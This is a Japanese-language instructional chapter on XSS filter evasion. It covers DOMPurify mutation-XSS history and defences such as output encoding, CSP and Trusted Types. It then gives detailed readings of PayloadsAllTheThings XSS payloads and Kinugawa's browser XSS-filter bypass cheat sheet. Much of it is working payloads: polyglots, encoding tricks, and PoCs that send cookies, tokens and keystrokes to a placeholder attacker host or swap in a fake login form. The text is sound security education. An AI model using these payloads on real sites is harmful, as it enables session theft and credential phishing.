現代のXSS回避の主戦場は、素のフィルタではなく**HTMLサニタイザ・ライブラリの回避**へ移りました。とくに **DOMPurify**（ユーザー入力HTMLから危険な要素・属性を除去する、事実上の標準ライブラリ）を対象とする **mutation XSS（mXSS: サニタイズは正しく行われたのに、その出力を `innerHTML` へ再代入した瞬間にブラウザのパーサが構造を“変異”させ、無害だったはずのマークアップが実行可能なコードに化ける現象）** が代表例です。原理は第11章の「5. 名前空間の切り替え」そのもので、`<svg>`/`<math>`/`<template>`/`<style>` の境界でのパース規則の食い違いを突きます。

具体的なバージョン依存の例（対象バージョン・修正・公開年を明記）:

- **DOMPurify < 2.0.17（修正: 2.0.17、2020年公開）**: Michał Bentkowski らが報告した、要素のネスト（入れ子）と名前空間の混同を利用したmXSSバイパス。この版までは、サニタイズ後の文字列が `innerHTML` 再解釈時に危険な構造へ復元され得た。2.0.17で修正。
- **DOMPurify 2.2.x〜2.3.x台のバイパス（各パッチで順次修正、2021〜2022年）**: `<style>`／コメント／foreign content の扱いを突く複数のmXSSが継続的に報告・修正された。
- **現行（DOMPurify 3.x、2023年以降）**: 多数の既知mXSSは塞がれているが、「サニタイザは常に最新へ保つ」「出力先コンテキストを固定する」ことが前提。**古いバージョンを使い続けること自体が脆弱性**になる、という点が実務上の教訓です。

つまり、OWASPチートシートが示した「ブラウザは壊れた入力を修復して実行する」という20年来の原理は、フィルタからサニタイザへと対象を変えつつ、現在も生き続けています。

---

### 13. では何をすべきか：正しい防御（結論）

Invictiとチートシートの結論は一致しています。**「危険なものを探して消す（フィルタ／ブラックリスト）」を主対策にしてはならない。「出力先で無害化する（エスケープ／エンコード）」を主対策にせよ。** 具体的な指針は次のとおりです。

1. **コンテキスト依存の出力エンコーディング（context-aware output encoding）を主対策にする。**
   Invicti曰く「エンコーディングの選択は文脈に依存する。ブラウザは場所によって文字を違う方法でエンコード／デコードするから」。ユーザー入力が最終的に置かれる **sink（ユーザー入力が実行・解釈される危険な代入先。例: `innerHTML`、`href`、`<script>` ブロック内、`style` 属性）** ごとに、HTMLボディ用・HTML属性用・JavaScript文字列用・URL用・CSS用のエスケープを使い分ける。ここは第1章の防御セクション（出力エンコーディングの原理）と完全に接続します。

2. **フィルタではなくエスケープ。** Invictiの中核命題「フィルタリングではなくエスケープを使うことがXSSを防ぐ唯一信頼できる方法」。ブラックリストは有限で、攻撃表現は無限だから（第11章の原理3）。

3. **CSP（Content Security Policy: どこからスクリプトを読み込み・実行してよいかをブラウザに宣言するHTTPヘッダによる多層防御）を併用する。** ただしInvictiは「CSPは安全なコーディングを**補完**するものであって、置き換えるものではない」と釘を刺します。理想は `nonce`（1回限りの乱数トークンを付けたスクリプトだけを許可）や `strict-dynamic` を用いた厳格CSPで、インラインスクリプトと未許可ソースを原理的に遮断すること。

4. **Trusted Types を導入する（対応ブラウザ）。** DOM系XSSの sink（`innerHTML` など）へ、検証を通した専用の型オブジェクト以外を代入できなくするブラウザ機構。文字列を直接 sink に流す経路を型システムで塞ぐため、mutation XSSを含む DOM XSS の温床を根本から断てる。

5. **信頼できるフレームワーク／ライブラリに任せる。** モダンフレームワーク（React、Angular等）の自動エスケープや、保守されている最新版のサニタイザ（DOMPurify等）を使い、自前の正規表現フィルタを書かない。第12章のとおり、ライブラリは常に最新へ。

6. **入力バリデーションは「多層防御の一枚」であって主対策ではない。** 形式・長さ・許可リスト（whitelist）による入力検証は有用だが、それ単独ではXSSを防げない。エスケープと組み合わせて初めて意味を持つ。

7. **WAFは緩和策であって解決策ではない。** 既知パターンの一時的遮断には役立つが、アプリの文脈を持たないため回避され得る。「WAFが弾いた＝直った」ではない(false sense of security)。

8. **継続的なセキュリティテスト。** 表現は無限に増えるため、スキャナやペネトレーションテストで「新しい回避に耐えられるか」を継続的に検証する。

> 出典: XSS Filter Evasion: Why Filtering Doesn't Stop Cross-Site Scripting (Invicti) — https://www.invicti.com/blog/web-security/xss-filter-evasion
> 出典: XSS Filter Evasion Cheat Sheet (OWASP Cheat Sheet Series) — https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

---

#### このセクションの一行結論

**フィルタ（ブラックリスト）は「壊れた入力を修復して実行するブラウザ」と「無限に増える表現」に対して構造的に負ける。防御の主軸は、入力を検閲することではなく、出力する場所（sink）の文脈に合わせて無害化（エスケープ／エンコード）することである。** 回避ペイロードの一つ一つは、この一文を裏づける実例にすぎません。

---

## ペイロード集とブラウザXSSフィルタ回避（Kinugawa）

前の節までで、XSS（クロスサイトスクリプティング＝攻撃者が用意した JavaScript を被害者のブラウザ上で実行させる脆弱性）を「どういう発想で見つけ、どういう文脈で刺すか」という枠組みを学んできました。この節では、その枠組みに肉付けをする **二つの実戦資料** を精読して統合します。

1. **PayloadsAllTheThings の XSS Injection**（swisskyrepo）——世界最大級の攻撃ペイロード（攻撃に使う入力文字列）カタログ。「この文脈ではどう書くか」をコンテキスト（context＝ユーザー入力が最終的に置かれる場所と、そこでのブラウザの解釈規則）別に引くための辞書です。
2. **filterbypass**（Masato Kinugawa）——ブラウザに **組み込まれていた** XSS フィルタ（XSS Auditor / IE・Edge の XSS Filter）を回避するためのチートシート。「ブラウザ自身が防ごうとした XSS を、どうやってすり抜けたか」という、フィルタ回避の教科書的アーカイブです。

この二つを合わせて読むと、**「ペイロードは文脈で選び、フィルタは仕組みの隙間で抜く」** というこの節の核心が見えてきます。単なる文字列の暗記ではなく、**なぜその文字列がブラウザで実行に至るのか**——HTML パーサ（構文解析器）の状態遷移、文字コード（charset）の再解釈、名前空間（namespace）の切り替え——という「仕組み」まで掘り下げます。これがフィルタや WAF（Web Application Firewall＝Web アプリの手前で悪意ある通信を検知・遮断する仕組み）に勝つための本当の武器です。

---

### 資料1: PayloadsAllTheThings — ペイロードは「文脈」で引く辞書

PayloadsAllTheThings（略称 PTAT）は、XSS に限らずあらゆる Web 脆弱性のペイロードを集めた巨大リポジトリで、その XSS Injection セクションは「反射型（Reflected）」「保存型（Stored）」「DOM 型」の三分類から始まり、注入できる文脈ごとにペイロードを整理しています。この資料の正しい使い方は、**「まず自分の入力がどの文脈に落ちているかを特定し、その文脈の欄からペイロードを選ぶ」** ことです。同じ `alert(1)` を出すのでも、置かれる場所によって「動く書き方」がまったく違うからです。

> 出典: PayloadsAllTheThings — XSS Injection README — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md

まず三分類の定義を確認します。

- **反射型 XSS（Reflected）**: 攻撃コードを含む URL などを被害者がクリックした「その場」でコードが実行される型。攻撃者がメールで悪意ある JavaScript を仕込んだリンクを送り、クリック時にログイン情報を盗む、という典型例が挙げられています。サーバーには痕跡が残らず、被害者の一回のアクセスで完結します。
- **保存型 XSS（Stored）**: 攻撃コードがサーバー側（DB など）に**保存**され、そのページを開いた**すべての閲覧者**に対して実行される型。ブログのコメント欄に仕込むのが典型で、影響範囲が最も広い。
- **DOM 型 XSS（DOM-based）**: サーバーを一切介さず、ブラウザ内の JavaScript が DOM（Document Object Model＝ページを構成する要素のツリー構造）を操作する過程で発生する型。`innerHTML` や `location.href` への代入が典型的な sink（シンク＝ユーザー入力が最終的に実行・解釈される危険な代入先）になります。サーバーに攻撃コードの記録が残らないため、検出・防御が最も難しいとされます。

#### コンテキスト1: タグを丸ごと注入できる場合

入力が HTML の本文としてそのまま出力される（`<` `>` がエスケープされていない）最も恵まれた文脈です。この場合、自分で好きなタグを書けるので、**スクリプトを実行できる「入れ物」となるタグ**を選ぶだけです。

```html
<script>alert('XSS')</script>
```

なぜ動くか: ブラウザの HTML パーサは `<script>` 開始タグを見つけると、`</script>` までを「テキスト」ではなく「実行すべき JavaScript」として扱う特別なモード（script データ状態）に入るためです。出所が開発者か攻撃者かは問われません。ただし現代のフィルタは真っ先に `<script` を弾くので、実戦ではむしろ次の「イベントハンドラ経由」が本命になります。

```html
<img src=x onerror=alert('XSS')>
<svg onload=alert(1)>
<svg/onload=alert('XSS')>
<body onload=alert(/XSS/.source)>
```

なぜ動くか: `<img src=x>` は「存在しない画像 x を読もうとして必ず失敗する」ため、失敗時に呼ばれる `onerror` イベントハンドラ（属性値に書いた JavaScript）が確実に発火します。`<svg onload>` や `<body onload>` は要素の読み込み完了時に発火します。**`<script>` を使わずに JavaScript を実行できる**のが要点で、`<script` を弾くフィルタを難なく越えます。`<svg/onload>` のように `/`（スラッシュ）でタグ名と属性を区切れるのは、HTML パーサが空白の代わりにスラッシュも属性の区切りとして許すためで、`svg onload` の間に空白を入れさせないフィルタを回避できます。

**ユーザー操作を必要としないベクトル**（画面表示だけで自動発火するもの）は特に価値が高い。PTAT は HTML5 タグを使った自動発火型を多数挙げています。

```html
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<video src=_ onloadstart="alert(1)">
<video><source onerror="javascript:alert(1)">
<audio src onloadstart=alert(1)>
<details open ontoggle="alert`1`">
<marquee onstart=alert(1)>
```

なぜ動くか: `autofocus` 属性は「ページ表示時にこの要素へ自動でフォーカスを当てる」指示なので、`onfocus`（フォーカス取得時）と組み合わせると**ユーザーが何もしなくても**発火します。`<video>`/`<audio>` の `onloadstart` はメディア読み込み開始で、`<details open ontoggle>` は開いた状態で描画された瞬間に発火します。`alert`1`` はバッククォート（テンプレートリテラル）で関数を呼ぶ書き方で、`(` `)` を禁止するフィルタを越えます。

一方、**ユーザー操作を要するが、フィルタが警戒していない**珍しいイベントも収録されています。`onpointer*` 系（`onpointerover` `onpointerdown` `onpointerenter` `onpointermove` など）や、タッチ操作の `ontouchstart` / `ontouchend` / `ontouchmove` です。

```html
<div onpointerover="alert(45)">MOVE HERE</div>
<body ontouchstart=alert(1)>
```

なぜ収録されているか: `onmouseover` は有名で弾かれやすいが、`onpointerover`（マウス・タッチ・ペンを統一的に扱う新しいイベント）はブロックリスト（危険な文字列を列挙して弾く方式）に載っていないことが多い、という「フィルタの盲点」を突くためです。

さらにマニアックな2例:

```html
<input type="hidden" accesskey="X" onclick="alert(1)">
<input type="hidden" oncontentvisibilityautostatechange="alert(1)" style="content-visibility:auto">
```

なぜ動くか: 前者は `type="hidden"`（画面に見えない入力欄）でも `accesskey`（ショートカットキー）を割り当てられる挙動を利用し、被害者が `CTRL+SHIFT+X`（PTAT によると Firefox 130 以降・Chrome 108 以降で有効な組み合わせ）を押すと隠し要素の `onclick` が発火します。後者は `content-visibility:auto`（画面外の要素の描画を遅延する CSS 機能）の状態が切り替わったときに発火する新しいイベント `oncontentvisibilityautostatechange` を使い、スクロールで要素が視界に入った瞬間に発火させます。いずれも「新しいブラウザ機能はフィルタの更新より速く増える」ことの実例です。

#### コンテキスト2: 属性値の中に注入する場合

入力が `<input value="ここ">` のように既存タグの属性値に入る場合、まず**属性を閉じてタグを抜け出す**必要があります。

```html
"><script>alert('XSS')</script>
"\><img src=x onerror=alert('XSS')>
"\><svg/onload=alert(String.fromCharCode(88,83,83))>
```

なぜ動くか: 先頭の `">` は「開いている属性値（`"`）と開始タグ（`>`）を強制的に閉じる」働きで、これで自分は「タグの外」に出られ、続けて新しいタグを書けます。`"\>` のようにバックスラッシュを挟むのは、一部の不完全なエスケープ処理（`"` だけを見張っている実装）を惑わせるためのバリエーションです。

#### コンテキスト3: JavaScript の文字列リテラルの中に注入する場合

入力が `<script>var q="ここ";</script>` のように、すでに実行される JavaScript の文字列の中に入る場合、**HTML タグは不要**で、JavaScript の構文として抜け出します。

```javascript
";alert(1);//
'-alert(1)-'
-(confirm)(document.domain)//
```

なぜ動くか: `";` で開いている文字列と文の両方を閉じ、`alert(1);` を新しい文として実行し、`//` で残り（元の `";` など）をコメント化して構文エラーを防ぎます。`'-alert(1)-'` は文字列連結の式の中に関数呼び出しを紛れ込ませる技法で、引用符の種類が `'` の場合に使います。この文脈は後述する Kinugawa の資料でも「XSS フィルタが守らない代表的な領域」として登場する重要ポイントです。

#### コンテキスト4: URL 文脈（href / src）— `javascript:` と `data:`

入力が `<a href="ここ">` のようにリンク先やリソース先の URL として使われる場合、**危険なスキーム（プロトコル）**を使います。

```html
javascript:alert(1)
javascript:prompt(1)
data:text/html,<script>alert(0)</script>
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+
```

なぜ動くか: `javascript:` スキームの URL は、リンクをたどった瞬間にその後ろの JavaScript が実行されます。`data:` スキームは「URL の中に文書の中身そのものを埋め込む」もので、`data:text/html,...` は新しい HTML 文書として解釈され、その中の `<script>` が動きます。`;base64,` を付ければ本文を Base64 でエンコードでき、`<` `>` を含まないので単純なフィルタを越えられます（例の Base64 は `<svg/onload=alert(2)>` を表します）。

#### エンコーディングによるフィルタ回避

`javascript:` や `alert` という文字列そのものを弾くフィルタに対しては、**「ブラウザは複数の表記を同じ文字として解釈する」** 性質を突きます。PTAT は多彩なエンコーディング回避を収録しています。

```html
<!-- 文字参照（HTML entity）: 10進・16進 -->
<img src=1 onerror=&#X61;&#X6C;&#X65;&#X72;&#X74;(1)>
&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58...  <!-- javascript: -->

<!-- JavaScript内の16進・Unicode・8進エスケープ -->
<script>alert('22')</script>
<script>eval('\x61lert(\'33\')')</script>
\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)   <!-- javascript: -->
ja...:alert(1)
\152\141\166\141...072alert(1)   <!-- 8進数表現 -->

<!-- 文字コードから文字列を組み立てる -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- javascript: の途中に改行・タブを挟む -->
java%0ascript:alert(1)   <!-- %0a = LF（改行） -->
java%09script:alert(1)   <!-- %09 = 水平タブ -->
java%0dscript:alert(1)   <!-- %0d = CR -->
javascript://%0Aalert(1) <!-- // でコメント化してから改行で復帰 -->

<!-- 各文字をバックスラッシュでエスケープ（無害化されない） -->
\j\av\a\s\cr\i\pt\:\a\l\ert\(1\)
```

なぜ動くか: `&#X61;` は文字参照で「a」を表し、ブラウザは属性値をパースする際にこれを実文字 `a` に復元してから解釈します。つまりフィルタが `alert` という並びを探しても、入力の見た目は `&#X61;&#X6C;...` なので一致しません。`a` `\x61` `\141`（8進）は JavaScript エンジンが「a」に解釈するエスケープで、`alert` は `alert` になります。`java%0ascript:` の `%0a`（改行）や `%09`（タブ）は、`javascript:` スキームの判定でブラウザがこれら制御文字を無視・除去するため、途中に挟んでも `javascript:` として成立し、`javascript:` という連続文字列を探すフィルタを裏切ります。**「フィルタが見る文字列」と「ブラウザが最終的に解釈する文字列」がズレる**——これがエンコーディング回避の統一原理で、この後の Kinugawa 資料でも文字コード（charset）レベルで同じ原理が繰り返し登場します。

#### 別フォーマットに潜む XSS（SVG・XML・Markdown・CSS）

XSS は HTML だけの話ではありません。ユーザーがアップロード・投稿できる各種フォーマットが sink になります。

**SVG ファイル**: SVG（ベクター画像形式）は実体が XML で、`<script>` を含められます。画像アップロード機能で SVG を受け付けていると、それを直接開いた被害者のブラウザで JavaScript が動きます。

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
<svg><title><![CDATA[</title><script>alert(3)</script>]]></svg>
```

なぜ動くか: SVG のルート要素に `onload` を書けば読み込み時に発火します。`<![CDATA[...]]>`（文字データ節＝中身を「ただの文字」として扱う XML の記法）と閉じタグを組み合わせるのは、`<desc>` や `<title>` の中身をエスケープするサニタイザ（sanitizer＝危険な要素・属性を除去する処理）の想定を、パーサの CDATA 処理でずらして `<script>` を「外」に出す技法です。PTAT は複数ベクトルを1ファイルに詰めた検証用 SVG（コードネーム red lightning、作者 noraj）も収録しており、`onload` 属性・`<desc>` 内 script・`<foreignObject>` 内 script・`<foreignObject>` 内 iframe(`src="javascript:..."`)・`<title>` 内 script・`<animateTransform onbegin>`・通常の `<script>` を一挙に試せます。

**XML**: 名前空間を明示すれば XHTML として script が動きます。

```xml
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
```

**Markdown**: リンク記法の URL 部分が sink になります。

```markdown
[a](javascript:prompt(document.cookie))
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K)
[a](javascript:window.onerror=alert;throw%201)
```

なぜ動くか: Markdown を HTML に変換するライブラリが URL のスキームを検証していないと、`[表示文字](javascript:...)` が `<a href="javascript:...">` になります。`window.onerror=alert;throw 1` は「例外を投げると `onerror` が呼ばれ、その引数が `alert` に渡る」ことを使い、`alert(` という文字列を書かずに alert を発火させる技巧です。

**CSS**: `background-image: url("...")` の中に `</style>` を紛れ込ませて CSS 文脈を脱出します。

```html
<style>
div { background-image: url("data:image/jpg;base64,<\/style><svg/onload=alert(document.domain)>"); }
</style>
```

なぜ動くか: HTML パーサは `<style>` の中身を探索中に `</style>` を見つけると即座に style 要素を閉じます（CSS の構文よりタグ境界の判定が優先される）。よって URL 文字列の途中の `</style>` で CSS を強制終了させ、その後ろの `<svg onload>` を通常の HTML として実行させられます。これは後述する mXSS（変異型 XSS）とも通じる「パーサの状態遷移を悪用する」発想です。

#### リモートスクリプトと Blind XSS

長いペイロードを1行に収められない、あるいは攻撃コードを後から差し替えたい場合、外部スクリプトを読み込ませます。

```html
<script src=//attacker/a></script>
<script src=14.rs></script>            <!-- 14.rs/#alert(document.domain) で内容指定 -->
<svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
```

**Blind XSS（盲目的 XSS）** は、自分では結果を確認できない場所（管理画面のログ、サポートチケット、`Referer` や `User-Agent` を記録する解析画面など）で発火する XSS です。発火を「外部への通信」で検知します。

```html
"><script src=//[attacker.tld]></script>
<script>document.location='http://[attacker]/?c='+document.domain</script>
```

なぜ有効か: 攻撃者は入力欄に仕込むだけで結果を見られませんが、被害者（多くは管理者）が管理画面でその値を表示した瞬間に攻撃者サーバーへリクエストが飛ぶので、発火の有無と発火した画面のドメインが判ります。PTAT は自前ホスト型の XSS Hunter（`mandatoryprogrammer/xsshunter-express`）や `ssl/ezXSS`、`LewisArdern/bXSS` などの検知基盤も紹介しています。狙うべきエンドポイントとして、問い合わせフォーム、サポートチケット、`Referer`/`User-Agent` を記録する解析・管理パネル、コメント欄が挙げられています。

#### インパクト（影響）を示す PoC ペイロード

`alert(1)` はあくまで「実行できた」証拠であり、実害を示すには次のような PoC（Proof of Concept＝概念実証）に置き換えます。バグバウンティ（脆弱性報奨金）の報告では、こうした「実際に何が盗めるか」を示すと評価が上がります。

```html
<!-- Cookie / トークンの窃取 -->
<script>new Image().src="http://[attacker]/?c="+document.cookie;</script>
<script>new Image().src="http://[attacker]/?c="+localStorage.getItem('access_token');</script>

<!-- CORS を使ったデータ送信（no-cors で応答を読まず送信だけ行う） -->
<script>fetch('https://[attacker]',{method:'POST',mode:'no-cors',body:document.cookie});</script>

<!-- キーロガー（押されたキーを送信） -->
<img src=x onerror='document.onkeypress=function(e){fetch("http://[attacker]/?k="+String.fromCharCode(e.which))},this.remove();'>

<!-- 偽ログインフォームによる資格情報窃取（UI Redressing） -->
<script>
history.replaceState(null,null,'../../../login');
document.body.innerHTML="<h1>Please login to continue</h1><form>Username:<input type='text'>Password:<input type='password'><input value='submit' type='submit'></form>";
</script>
```

なぜ効くか: `document.cookie` にセッション ID が入っていれば（`HttpOnly` 属性が付いていない場合）、それを画像リクエストの URL に載せるだけで攻撃者サーバーに漏れます。`new Image().src=...` は目に見える変化を起こさず送信できるため気づかれにくい。UI Redressing の例は `history.replaceState` で URL バーの表示を `/login` に偽装しつつ、`document.body.innerHTML` をまるごと偽ログイン画面に差し替え、正規サイト上で資格情報を入力させます。

検証を効率化する小技も収録されています。保存型 XSS ではポップアップを何度も閉じるのが面倒なので `alert` の代わりに `console.log(...)` や `debugger;` を使う、`document.domain` と `window.origin` を同時に出して**どのオリジン（origin＝スキーム＋ホスト＋ポートの組。同一オリジンポリシーの単位）で発火したか**を一目で確認する、といった実務テクニックです。

```html
<script>alert(document.domain.concat("\n").concat(window.origin))</script>
```

#### ポリグロット（polyglot）— 文脈を選ばない万能ペイロード

ここまで見た通り、ペイロードは本来「文脈に合わせて選ぶ」ものです。しかし**注入先の文脈が事前に分からない**、あるいは**一発で複数箇所を試したい**ときに使うのがポリグロット（polyglot＝「多言語」の意。複数の文脈で同時に成立するように設計された一つの文字列）です。

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

なぜ「万能」か（0xsobky のポリグロットの分解）:
- `jaVasCript:` は大文字小文字を混ぜてある。ブラウザはスキーム名を**大小無視**で解釈するので `javascript:` として成立し、URL 文脈で発火する。同時に文字列としては `javascript` と一致しにくい。
- `/*...*/` は JavaScript でも CSS でもコメントとして働くので、JS 文脈・CSS 文脈のどちらに落ちても、前後の既存コードを壊さず「無害な繋ぎ」として機能する。
- `oNcliCk=alert()` は、もし属性文脈に落ちていれば有効なイベントハンドラ属性になる。
- `</stYle/</titLe/</teXtarEa/</scRipt/` は、`<style>` `<title>` `<textarea>` `<script>` という **「中身を生テキストとして扱う要素」の内部に落ちた場合に、それらを片端から閉じて脱出する**ための閉じタグ群。どれか一つに入っていても抜け出せる。
- 末尾の `\x3csVg/<sVg/oNloAd=alert()//>` は、脱出後に HTML 文脈で `<svg onload>` を発火させる本体（`\x3c` は `<`）。

つまり一本の文字列に「URL 文脈」「JS/CSS コメント」「属性文脈」「rawtext 要素からの脱出」「HTML タグ注入」を全部詰め込み、**どの文脈に落ちても最低一つの経路で発火する**ように作られています。PTAT は他に Rsnake、Ashar Javed、Mathias Karlsson、@s0md3v らの著名ポリグロットも収録しています。

```javascript
-->'"/></sCript><svG x=">" onload=(confirm)``>       <!-- @s0md3v -->
';alert(String.fromCharCode(88,83,83))//...--></SCRIPT>">'><SCRIPT>...  <!-- Rsnake -->
```

> 出典: PayloadsAllTheThings — XSS Polyglot — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/2%20-%20XSS%20Polyglot.md

---

### 資料2: Kinugawa filterbypass — ブラウザ組み込み XSS フィルタの回避

Masato Kinugawa（きぬがわまさと）氏の **filterbypass** は、「Browser's XSS Filter Bypass Cheat Sheet（ブラウザの XSS フィルタ回避チートシート）」というタイトルの GitHub リポジトリで、内容は主に Wiki に置かれています。Wiki は次の3ページ構成です。

- **Home**（目次）
- **Browser's XSS Filter Bypass Cheat Sheet**（当時まだ動いた回避手法の本体）
- **Fixed Bypass Archive**（すでにブラウザ側で修正された回避手法のアーカイブ）

> 出典: filterbypass（Masato Kinugawa） — https://github.com/masatokinugawa/filterbypass
> 出典: Browser's XSS Filter Bypass Cheat Sheet（Wiki） — https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet

#### 前提: 「ブラウザ XSS フィルタ」とは何だったか（歴史的経緯）

まず重要な時代背景を押さえます。この資料が対象にしている **XSS Auditor（Chrome/Safari）** と **XSS Filter（IE/Edge）** は、かつてブラウザに組み込まれていた「反射型 XSS を検知して自動でブロックする機能」です。仕組みは大まかに、**「URL などのリクエストに含まれる文字列が、レスポンスの HTML 内でそのまま実行可能なスクリプトとして現れていたら、それを反射型 XSS とみなして無害化する」** というもの。いわば「入力と出力の一致」を見ていました。

しかしこの方式は多くの問題を抱えていました。第一に、**フィルタ自体が新たな脆弱性の温床**になった——フィルタが「XSS だ」と判断して HTML の一部を書き換えることで、かえって別の XSS（フィルタ誘発型の情報漏えいなど）を生む事例が知られます。第二に、後述するように**回避方法が無数にあり**、防御としての実効性が低かった。こうした理由から、**Chrome は 78（2019年後半）で XSS Auditor を完全に削除**し、Microsoft も Edge の Chromium 化に伴い XSS Filter を廃止しました。

したがって **filterbypass は現在では「歴史資料」** です。しかし本書で学ぶ価値は絶大です。なぜなら、ここで使われた回避テクニックの**原理**——文字コードの再解釈、パーサの状態遷移、同一オリジンリソースの悪用、名前空間の混乱——は、**現代の WAF 回避・サニタイザ回避・mXSS にそっくりそのまま応用が効く**からです。Kinugawa 氏自身、Wiki の末尾で「ここにバイパスが載っていなくても実際の悪用は可能であり、必ず根本的な XSS 対策（フィルタ頼みにしないこと）を行うべきだ」と強調しています。

#### そもそもフィルタが「守らない」領域

回避テクニックの前に、Kinugawa 氏はまず **「フィルタが最初から守っていない（=素通しする）文脈」** を列挙しています。ここに落ちる XSS は、そもそも回避を考えるまでもなく通ります。

XSS Auditor（Chrome/Safari）が守らない領域:
- **JavaScript 文字列リテラル内の XSS**: 例 `<script>var q="[ここに注入]";alert(1)//</script>`。入力がすでに `<script>` の中の文字列に入る場合、フィルタの「入力と出力の一致」検知が働きにくい。
- **URL 単独の XSS**: 例 `<a href="javascript:alert(1)">Link</a>`。
- **複数の注入ポイント**: ページ内の2箇所以上に別々に注入できる場合。フィルタは一つの連続したパターンを見るので、分割されると検知できない。
- **DOM 型 XSS**: `document.write()` 経由を除き、ほとんどの DOM 型はサーバーレスポンスに現れないため素通し。
- **XML ページの XSS**、**外部リクエストを送るだけのタグ**。

IE/Edge の XSS Filter が守らない領域:
- **すべての DOM 型 XSS**
- **複数注入ポイント**
- **文字列操作（削除・置換）を伴う場合**——アプリ側が入力中の特定文字を消したり置き換えたりすると、フィルタが見た反射パターンと実際の出力がズレて検知不能になる。

この「守らない領域リスト」自体が、防御側にとっては**「フィルタに頼れない典型ケース集」**として今も有益です。

#### XSS Auditor（Chrome/Safari）回避テクニック

以下は Wiki 本体（当時動作）と Fixed Bypass Archive（修正済み）から統合した主要手法です。修正済みのものは対象バージョンを併記します（陳腐化への注意——これらは**すでに塞がれています**が、原理の学習が目的です）。

**1. SVG アニメーションの `values` 属性を使う（Safari 系で有効だった）**

```html
<svg><animate xlink:href=#x attributeName=href values=&#x3000;javascript:alert(1) /><a id=x><rect width=100 height=100 /></a>
```

なぜ動いたか: SVG の `<animate>` は「別要素の属性を時間変化で書き換える」機能で、ここでは `<a id=x>` の `href` を `javascript:alert(1)` に書き換えます。フィルタは静的な HTML を見るので「`href=javascript:` が反射している」とは気づけません。先頭の `&#x3000;`（全角スペースの文字参照）は、`javascript:` の直前に無害な文字を置いてフィルタのパターン判定をずらす役割です。Chrome では PoC 1 が Chrome 59、`values=&#106;avascript:`（`&#106;` は `j` の文字参照）を使う PoC 2 が Chrome 62 で修正されました。

**2. 複数の null 文字（0x00）を前置する（Chrome、Chrome 62 で修正）**

```
[0x00][0x00][0x00][0x00][0x00][0x00][0x00]<script>alert(1)</script>
```

なぜ動いたか: フィルタが連続する null バイトを正しく処理できず、後続の `<script>` を見落とすバグを突いたものです。「任意タグを書ける」「null バイトが出力される」「直前に空白がない」の三条件で成立しました。

**3. 半端な（閉じきらない）script 閉じタグ（Chrome のみ、Chrome 61 で修正）**

```html
<div> <script>alert(1)</script </div><div id="x"></div>
```

なぜ動いたか: `</script`（`>` を欠く不完全な閉じタグ）の後ろに空白があると、フィルタは script の範囲を正しく切り出せず、しかしブラウザは後続の `<` までを script 終端として実行してしまう、というパーサ挙動の差を利用しました。

**4. script 内の `-->` によるコメント（Chrome、Chrome 62 で修正）**

```html
<div><script>alert(1)
--></div><script src=/test.js></script>
```

なぜ動いたか: HTML コメントの終端 `-->` を script 内に置くと、フィルタとブラウザで「どこまでが実行対象か」の解釈がズレ、フィルタの無害化を免れました。

**5. 半端な `<form>` による情報窃取（Chrome、Chrome 62 で修正）**

```html
<form action="form">
<input type="hidden" name="q" value=""></form><form action=https://attacker/">
<input type="hidden" name="secret" value="a09d3ef0">
<input type="submit">
</form>
```

なぜ有効だったか: これは JavaScript を実行するのではなく、**ページ内に既存する秘密情報（隠しフォームの値）を攻撃者サーバーに送信させる**タイプ。注入した `<form action=https://attacker/>` が既存の秘密入力を「取り込んで」送信先を書き換えます。フィルタはスクリプト実行を見張るので、この手の情報漏えいは見逃しました。

**6. `<object>` + `<param name=url/code>` で Flash 実行（Chrome のみ、Chrome 64 で修正）**

```html
<object allowscriptaccess=always><param name=url value=https://l0.cm/xss.swf>
<object allowscriptaccess=always><param name=code value=https://l0.cm/xss.swf>
```

なぜ動いたか: `<script>` を使わず `<object>`＋Flash（`.swf`）で JavaScript を呼ぶ経路。`allowscriptaccess=always` は SWF から親ページの JavaScript 呼び出しを許す設定で、`ExternalInterface.call()` に未エスケープ文字列が渡ると任意 JS が動きます。Flash が使える環境が前提でした（Flash 自体が 2020 年末に終了）。

**7. リンク＋半端な `<base>` タグ（Chrome、Chrome 65 で修正）**

```html
<div> <a href=//**/alert(1)>XSS</a><base href="javascript:\ </div><div id="x"></div>
```

なぜ動いたか: `<base href="javascript:...">` はページ内の相対リンクの基準 URL を書き換える要素で、これを不完全に置くことで相対 `href` が `javascript:` スキームに解決され、リンククリックで実行されました。

**8. 同一ドメインのリソースを悪用する（最重要の発想）**

XSS Auditor は「クエリを持たない**同一ドメイン**のリソースはスキップする（=信頼して検査しない）」という仕様の穴を持っていました。そこで、**攻撃コードを一度同一ドメインに置いてから読み込む**と検査を丸ごと回避できました。

```html
<!-- アップロード機能で置いた自前JSを読む -->
<script src=/bypass/usercontent/xss.js></script>

<!-- 同一ドメインに既にあるライブラリをテンプレートインジェクションに悪用 -->
<script src="/js/angular1.6.4.min.js"></script>
<p ng-app>{{constructor.constructor('alert(1)')()}}

<!-- jQuery を悪用した DOM Clobbering -->
<form class=child><input name=ownerDocument><script><!--alert(1)</script></form>
```

